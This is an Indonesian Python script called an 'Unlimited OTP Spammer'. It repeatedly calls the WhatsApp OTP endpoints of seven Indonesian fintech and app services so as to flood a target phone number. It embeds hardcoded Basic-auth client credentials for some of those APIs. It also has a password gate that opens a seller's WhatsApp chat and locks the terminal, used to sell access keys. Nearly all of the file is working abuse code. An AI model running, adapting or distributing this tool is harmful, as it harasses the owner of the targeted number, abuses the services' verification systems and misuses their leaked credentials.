#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Unlimited OTP Spammer - Original Script + Modified Aggressive Auth + Password Check + Terminal Lock + Direct WA Open via am

import requests
import json
import random
import string
import time
import os
import signal
import sys
import subprocess # Import subprocess untuk am start

a = '\x1b[1;30m'
m = '\x1b[1;31m'
p = '\x1b[1;37m'
h = '\x1b[1;32m'
r = '\x1b[0m'

# === KONFIGURASI LINK WHATSAPP DAN PASSWORD ===
WHATSAPP_DIRECT_LINK = "https://wa.me/6285167879598?text=Halo%20Admin,%20saya%20mau%20script%20spam%20OTP%20WA%20bayar%20berapa%3F" # <-- Link WA kamu
CORRECT_PASSWORD = "she0rif" # <-- Password yang benar

def clear():
    os.system('clear')

def signal_handler(sig, frame):
    print(f'\n{a}[{m}!{a}]{p} Program dihentikan')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def codex(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# === FUNGSI ORIGINAL LU - TIDAK DIUBAH ===
def send_adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel': 'whatsapp'}
    try:
        res = requests.post(url, json=payload, timeout=10)
        result = json.loads(res.text).get('message', '')
        if result == 'success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Adiraku Error{m} :{a}', e)

def send_singa(nomor):
    url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
    payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
    headers = {'Content-Type': 'application/json; charset=utf-8'}
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        result = json.loads(res.text).get('msg', '')
        if result == 'Success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Singa Error{m} :{a}', e)

def send_speedcash(nomor):
    url_token = 'https://sofia.bmsecure.id/central-api/oauth/token'
    headers_token = {'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==', 'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        res_token = requests.post(url_token, data='grant_type=client_credentials', headers=headers_token, timeout=10)
        auth = json.loads(res_token.text).get('access_token', '')
        if not auth:
            print(f' {a}[{m}!{a}]{p} Gagal Mendapatkan Token SpeedCash')
            return
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP SpeedCash Error{m} :{a}', e)
        return
    url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
    payload_otp = {'version_name': '6.2.1 (428)', 'phone': nomor, 'appid': 'SPEEDCASH', 'version_code': 428, 'location': '0,0', 'state': 'REGISTER', 'type': 'WA', 'app_id': 'SPEEDCASH', 'uuid': '00000000-4c22-250d-ffff-ffff' + codex(8), 'via': 'BB ANDROID'}
    headers_otp = {'Authorization': f'Bearer {auth}', 'Content-Type': 'application/json'}
    try:
        res_otp = requests.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
        result = json.loads(res_otp.text).get('rc', '')
        if result == '00':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP SpeedCash Error{m} :{a}', e)

def otp_bisatopup(nomor):
    url = f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={codex(16)}&version_name=6.12.04&version=61204'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'phone_number': nomor}
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        try:
            result = response.json().get('message', '')
        except:
            result = response.text
        if result == 'OTP akan segera dikirim ke perangkat':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP BisaTopUp Error{m} :{a}', e)

def jogjakita(nomor):
    try:
        url_token = 'https://aci-user.bmsecure.id/oauth/token'
        payload_token = 'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1'
        headers_token = {'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}
        r1 = requests.post(url_token, data=payload_token, headers=headers_token, timeout=10)
        r1.raise_for_status()
        data1 = r1.json()
        auth = data1.get('access_token')
        if not auth:
            print(f' {a}[{m}!{a}]{p} Gagal ambil access_token')
            return
        url_otp = 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send'
        payload_otp = {'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}
        headers_otp = {'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {auth}'}
        r2 = requests.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
        r2.raise_for_status()
        data2 = r2.json()
        if str(data2.get('rc')) == '200':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP JogjaKita Error{m} :{a}', e)

def cairin(nomor):
    url = 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT'
    data = {'appVersion': '3.0.4', 'phone': nomor, 'userImei': codex(32)}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        if response.text.strip() == '{"code":"0"}':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Cairin Error{m} :{a}', e)

def adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel': 'whatsapp'}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'okhttp/4.9.0'}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        r.raise_for_status()
        response = r.json()
        if response.get('message') == 'success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP ADIRAKU V2 Error{m} :{a}', e)
        print()

# === BANNER ORIGINAL LU ===
def banner_spam_otp_only():
    os.system('clear')
    print(f"""{m}
╭─────────────────────────────────────────────────────────╮
{m}│ ⠀{a}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀{a}⠀⠀⠀⠀⠀⠀⠀⢀⣼⣷⣀⠀⠀⣠⣾⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀{a}⠀⠀⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠻⣿⣿⣷⣄⠀⠀  {a}[ {m}> {p}OTP Spammer {m}< {a}] {m}│
{m}│ ⠀⠀⠀{a}⠀⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠋⠀⠀⡈⠻⣿⣿⣷⣄⠀ {h}•{p} Author {m}: {p}Sherif {h}•⠀⠀⠀⠀⠀ {m}│
{m}│ ⠀⠀{a}⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠋⠀⠀⢠⣾⣿⣦⡈⠻⣿⣿⣦⡄⠀⠀⠀⠀⠀⠀                       {m}│
{m}│ {a}⠀⠀⢀⣴⣿⣿⡟⠃⣠⣾⣿⡿⠋⠀⠀⠀⠀⠀⠙⠛⠛⠛⠆⠈⠛⠛⠛⠣⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│{a} ⢀⣴⣿⣿⡟⠃⢠⣾⣿⡿⠋⠀⢀⣤⣶⣶⣦⣄⠀⠀⣤⣤⣤⣤⣤⣤⡄⠀⠀⢠⣤⣤⣤⣤⣄⡀                    {m}│
{m}│{a} ⠙⢿⣿⣿⣦⡀⠀⠙⠋⠀⠀⢰⣿⠋⠁⠀⠈⢻⣷⠀⠈⠉⢹⣿⠉⠉⠁⠀⠀⢸⣿⠉⠉⠉⢻⣷                    {m}│
{m}│ {a}⠀⠀⠙⢿⣿⣿⣆⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢀⣿⠆⠀⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⣤⣤⣤⣾⡟                    {m}│
{m}│ {a}⠀⠀⣴⡀⠙⢿⣿⣷⣆⠀⠀⠸⣿⣦⣀⣀⣠⣾⡿⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⠉⠉⠉⠁⠀                    {m}│
{m}│{a} ⠀⠺⣿⣿⣦⡀⠙⢿⣿⣷⣄⠀⠈⠙⠛⠛⠛⠉⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀{a}⠀⠈⠻⣿⣿⣦⡀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⣠⣦⣴⣶⠄⢀⣴⣴⣶⡔⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⡀⠙⢿⣿⠛⠀⠀⣠⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⡀⠁⠀⣠⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                     {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⠟⠁⠀⠈⠻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠁⠀                                         {m}│
╰─────────────────────────────────────────────────────────╯

 {a}[[101m{h} INFO {r}{a}]{p} Masukkan Nomor Telepon Target Dengan Awalan 08×××
 {a}[[101m{h} INFO {r}{a}]{p} Script Ini Hanya Work Pada Target Nomor Indonesia
"""
        )

# === FUNGSI REDIRECT WA + TERMINAL LOCK (MENGGUNAKAN AM START) ===
def force_whatsapp_redirect():
    """Force redirect ke WhatsApp TANPA MENAMPILKAN LINK, menggunakan am start."""
    # Tidak menampilkan apa pun di terminal
    # print(f"\n{a}[{m}🚨{a}]{p} MENGALIHKAN KE WHATSAPP ADMIN...") # Di-comment agar tidak muncul
    # print(f"{a}[{m}💬{a}]{p} Membuka chat WhatsApp ke admin...") # Di-comment agar tidak muncul
    # print(f"{a}[{m}🚀{a}]{p} Pesan akan otomatis terisi...") # Di-comment agar tidak muncul

    link_target = WHATSAPP_DIRECT_LINK # Gunakan link kamu langsung

    # --- MODIFIKASI: Gunakan subprocess untuk menjalankan am start ---
    try:
        # Format perintah am start untuk membuka link WhatsApp
        # Ini mengirim intent ACTION_VIEW ke sistem Android
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', link_target], check=True)
        # Tidak menampilkan pesan sukses di terminal
        # print(f"{a}[{h}✓{a}]{p} WhatsApp berhasil dibuka ke chat admin!") # Di-comment agar tidak muncul
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Jika am start gagal (mungkin karena izin atau am tidak ditemukan di path tertentu)
        # Kita bisa kembali ke webbrowser.open sebagai fallback
        print(f"\n{a}[{m}!{a}]{p} Gagal membuka WA via 'am start'. Mencoba fallback...")
        try:
            import webbrowser
            webbrowser.open(link_target)
        except:
             print(f"{a}[{m}!{a}]{p} Fallback juga gagal. Buka manual: {link_target}")
        # Jika fallback juga gagal, kita tetap lanjutkan ke loop lock

    # Tidak menampilkan pesan tambahan di terminal
    # time.sleep(3)
    # print(f"\n{a}[{m}⏳{a}]{p} Terminal dikunci. Tekan {h}CTRL+C{p} untuk keluar...")
    # print(f"{a}[{m}💡{a}]{p} Jika tidak merespons, tutup aplikasi Termux.")

    # Masuk ke loop yang hanya bisa dihentikan oleh Ctrl+C
    try:
        while True:
            time.sleep(1) # Loop yang berjalan selamanya, tapi tidak melakukan apa-apa
            # Fungsi signal_handler akan menangkap Ctrl+C dan memanggil sys.exit
    except KeyboardInterrupt:
        # Jika Ctrl+C ditekan saat loop berjalan, tangkap dan keluar
        print(f"\n{a}[{m}!{a}]{p} Program dihentikan oleh user (Ctrl+C)")
        sys.exit(0)

# === SISTEM OTENTIKASI BARU (DENGAN PASSWORD CHECK, ENTER = REDIRECT) ===
def aggressive_auth_system():
    """Sistem autentikasi baru - tampilan disembunyikan, frasa diganti, password check, enter kosong = redirect WA"""
    banner_spam_otp_only() # Tampilkan banner asli dulu
    print("") # Baris kosong sebelum UI baru
    print(f"""{m}
╭─────────────────────────────────────────────────────────╮
│               {p}AGGRESSIVE AUTH SYSTEM{m}                    │
╰─────────────────────────────────────────────────────────╯{p}""")

    # --- TAMPILAN BARU ---
    print(f"{a}[{m}🔒{a}]{p} Script ini memerlukan kunci akses")
    print(f"{a}[{m}💬{a}]{p} Masukkan kunci, atau tekan {h}ENTER{p} untuk minta kunci ke admin")
    print(f"{a}[{m}🔑{a}]{p} Kunci akses: {h}🔐{p}")
    # Link TIDAK DITAMPILKAN di sini
    # print(f"{a}[{m}🔗{a}]{p} WhatsApp Direct: {h}{WHATSAPP_DIRECT_LINK}{p}\n")
    print("") # Baris kosong untuk estetika

    max_attempts = 3
    attempts = 0

    while attempts < max_attempts:
        # Ganti prompt sesuai permintaan
        print(f"{a}[{m}?{a}]{p} Masukkan kunci atau tekan {h}ENTER{p} untuk WA ({max_attempts - attempts} percobaan tersisa): {h}", end="")

        user_input = input().strip()
        print(f"{r}", end="")

        # Jika input kosong (tekan enter), langsung redirect
        if user_input == "":
            print(f"\r{a}[{m}⚠️{a}]{p} Input kosong! Mengalihkan ke admin...") # \r untuk overwrite prompt
            time.sleep(1)
            force_whatsapp_redirect() # Panggil fungsi redirect langsung
        # Jika input benar, kembalikan True
        elif user_input == CORRECT_PASSWORD:
            print(f"\n{a}[{h}✓{a}]{p} Kunci akses benar! Menjalankan script...")
            time.sleep(1)
            return True # Kembali ke fungsi main
        else:
            # Jika salah, tambah counter
            attempts += 1
            if attempts < max_attempts:
                 print(f"{a}[{m}✗{a}]{p} Kunci salah! Coba lagi.")
            # Jika sudah 3x salah, redirect
            if attempts >= max_attempts:
                print(f"{a}[{m}✗{a}]{p} Kunci salah 3 kali berturut-turut!")
                print(f"{a}[{m}🔄{a}]{p} Mengalihkan ke admin untuk mendapatkan kunci...")
                time.sleep(2)
                force_whatsapp_redirect() # Panggil fungsi redirect

    # Jika loop selesai tanpa return True (seharusnya tidak tercapai karena redirect di atas), return False
    return False

# === FUNGSI INPUT NOMOR (TIDAK DIMODIFIKASI) ===
def nomor_otp():
    while True:
        banner_spam_otp_only()
        try:
            nomor = input(f' {a}[{m}?{a}] {p}Masukkan Nomor Telepon Target {m}:{a} ')
            print()
            if nomor.startswith('08') and nomor.isdigit():
                return nomor
            else:
                input(f" {a}[{m}!{a}] {p}Format Nomor Telepon Tidak Valid {a}| [101m{h} ENTER {r}")
        except (EOFError, KeyboardInterrupt):
            input(f" {a}[{m}!{a}] {p}Kamu Sengaja Keluar Paksa Dari Program {a}| [101m{h} ENTER {r}")
            sys.exit(0)

# === UNLIMITED LOOP (TIDAK DIMODIFIKASI) ===
def unlimited_spam():
    try:
        nomor = nomor_otp()
        count = 0

        while True:  # 🔁 INFINITE LOOP
            count += 1
            print(f'\n{a}[{m}BATCH {count}{a}]{p} Memulai spam OTP...')
            print(f'{m}══════════════════════════════════════════════{r}')

            # ✅ EKSEKUSI SEMUA SERVICE ORIGINAL
            send_adiraku(nomor)
            send_singa(nomor)
            send_speedcash(nomor)
            otp_bisatopup(nomor)
            jogjakita(nomor)
            cairin(nomor)
            adiraku(nomor)

            print(f'{m}══════════════════════════════════════════════{r}')
            print(f'{a}[{m}BATCH {count}{a}]{p} Selesai. Delay 60 detik...')
            print(f'{a}[{m}INFO{a}]{p} Tekan CTRL+C untuk berhenti')
            time.sleep(60)  # ⏳ Delay antar batch

    except KeyboardInterrupt:
        print(f'\n{a}[{m}!{a}]{p} Program dihentikan setelah {count} batch')
        sys.exit(0)

def main():
    # === GANTI FUNGSI UTAMA UNTUK MENGGUNAKAN OTENTIKASI BARU ===
    auth_success = aggressive_auth_system() # Jalankan auth system baru dan simpan hasilnya
    if auth_success:
        # Jika auth berhasil (password benar), lanjutkan ke spam
        unlimited_spam()
    else:
        # Jika auth gagal (seharusnya tidak tercapai karena redirect), exit
        print(f"{a}[{m}!{a}]{p} Akses ditolak. Keluar.")
        sys.exit(1)

if __name__ == '__main__':
    main()
